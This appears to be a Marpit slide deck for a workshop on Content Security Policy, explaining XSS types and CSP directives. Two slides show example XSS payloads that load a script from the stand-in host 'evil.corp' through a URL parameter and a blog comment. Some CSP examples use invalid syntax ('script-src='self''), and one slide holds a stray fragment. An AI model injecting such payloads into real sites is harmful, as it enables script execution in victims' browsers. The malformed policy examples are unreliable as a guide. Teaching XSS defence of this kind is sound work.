---
marp: true
size: 16:9
theme: gaia
footer: AppSec Workshop - Content Security Policies
paginate: true
style: |
  section {
    background: #11133C;
    font-color: #F9EAD4;
  }
  section {font-family: 'Inter'; color: black; }
  
  section.lead h1 {
    text-align: center;
    color: #F9EAD4;
    font-size: 1.5rem;
  }

  section h1, h2, h3, h4, h5, li, p, blockquote, blockquote:before, blockquote:after, footer, lead, th, td {
    color: #F9EAD4;
  }

  section h1 {
    font-size: 1.2rem;
  }

  section::after {
    content: attr(data-marpit-pagination) '/' attr(data-marpit-pagination-total);
    font-size: 0.8rem;
    color: #F9EAD4;
  }

  section blockquote {
    margin:auto;
  }
  section footer {
    font-size: 0.3rem;
  }

---

<!-- _class: lead -->
# Content Security Policies<br>Workshop

>Security isn’t something you buy it’s something you do!

---

# Agenda

```
09:00 - 09:30 - Why do we need CSP - the risk of injections
              - What is CSP
              - How can we use CSP
09:30 - 11:00 - CSP directives - with a ☕️ break :
              - "default-src"
              - "script-src" - "style-src" - "font-src"
              - "connect-src"
              - Media directives - "img-src" and "media-src"
11:00 - 11:30 - Reporting URI - logging violation issues
              - "report-uri" directive
              - Migration approach for your existing project
11:45 - 12:00 - Summary
```

---

# Why do we need CSP - 1 / 2

The primary goal of CSP is to mitigate and report XSS attacks!

* Content Security Policy (CSP) is an added layer of security
* XSS attacks exploit the browser's trust in the content received from the server
* Malicious scripts are executed by the victim's browser because the browser trusts the source of the content 

---

# Why do we need CSP - 2 / 2

* CSP helps to detect and mitigate certain types of attacks
  - Cross-Site Scripting (XSS) and data injection attacks
  - Attacks are used for data theft, site defacement, malware distribution etc.
* XSS ranked as 3rd on the OWASP TOP 10 list

---

# What is CSP?

From the W3C* definition :

>This [document](https://www.w3.org/TR/CSP3/#intro) defines Content Security Policy (CSP), a tool which developers can use to lock down their applications in various ways, mitigating the risk of content injection vulnerabilities such as cross-site scripting, and reducing the privilege with which their applications execute.

`*W3C = World Wide Web Consortium`

---

# Types of XSS attacks

There are several types of XSS:

|XSS      |-     |
|---------|------|
|Reflected|Type 1|
|Stored   |Type 2|
|DOM Based|Type 0|

`DOM = Document Object Model - W3C standard`

---

# Reflected XSS attack - 1 / 2

Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user provided data.


Example:
```html
https://insecure-web.com/comment?message=<script src=https//evil.corp/badscript.js></script>
```

---

![bg 70%](./resources/reflected_xss_diagram.png)

---

# Stored (persistent) XSS attack

Stored XSS generally occurs when user input is stored on the target server, such as in a database, in a message forum, visitor log, comment field, etc. And then a victim is able to retrieve the stored data from the web application without that data being made safe to render in the browser.

 Instead of a decent comment on the blog's input field, the attacker write:
```html
<script src='https//evil.corp/badscript.js'/>
```

---

![bg 70%](./resources/stored_persistent_xss.png)

---

# Terms to help organize types of XSS - 1 / 2

* **Server XSS** - occurs when untrusted user supplied data is included in an HTTP response generated by the server. 
* **Client XSS** - occurs when untrusted user supplied data is used to update the DOM with an unsafe JavaScript call. A JavaScript call is considered unsafe if it can be used to introduce valid JavaScript into the DOM.

---
# Terms to help organize types of XSS - 2 / 2

|  XSS     |        Server          |       Client        | 
|----------|------------------------|---------------------|
| Stored   | Stored Server XSS      | Stored Client XSS   |
| Reflected| Reflected Server XSS   | Reflected Client XSS|

---

## How can we use CSP to mitigate XSS
 
In your `<head>` section<br>`Content-Security-Policy: <policy-directive>; <policy-directive>`

Example:

```html
<meta http-equiv="Content-Security-Policy" content="Your Policy Definition here ...">
```

---

# XSS - Reflected (type-1)

Let's explore this type of XSS.

Demo

neste what 

---

<!-- _class: lead -->

# Explore directives

## `default-src` - `script-src`<br>`style-src` - `font-src`

---

# Directive : `default-src`

If a [`default-src`](https://www.w3.org/TR/CSP3/#directive-default-src) directive is present in a policy, its value will be used as the policy’s default source list. That is, given `default-src 'none';` `script-src 'self'`, script requests will use `'self'` as the source list to match against. Other requests will use `'none'`.
Test code:
```html
<head>
...
  <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
...
</head>
```

---

# Directive : `script-src`

The [script-src](https://www.w3.org/TR/CSP3/#directive-script-src) directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution. 

Test code:
```html
<head>
...
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src='self'; ">
...
</head>
```

---

# Directive : `font-src`

```html
<head>
...
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src='self'; style-src='self'; font-src='self'; ">
...
</head>
```


---
<!-- _class: lead -->

# Explore directive

## `connect-src` - `media-src`


---

<!-- _class: lead -->

# Reporting violations of directives<br>`report-uri`

